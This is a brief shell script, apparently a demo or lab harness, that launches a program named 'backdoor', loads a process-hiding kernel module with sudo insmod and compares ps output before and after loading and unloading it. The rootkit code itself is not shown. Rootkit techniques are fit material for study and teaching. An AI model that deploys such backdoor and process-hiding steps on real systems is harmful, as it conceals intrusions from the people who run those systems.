# /bin/sh

./backdoor &
make 1>/dev/null
echo 'Before inserting module'
ps
echo

sudo insmod hide_processko.ko
echo 'After inserting module'
ps
echo

sudo rmmod hide_processko.ko
echo 'After removing module' 
ps

make clean 1>/dev/null
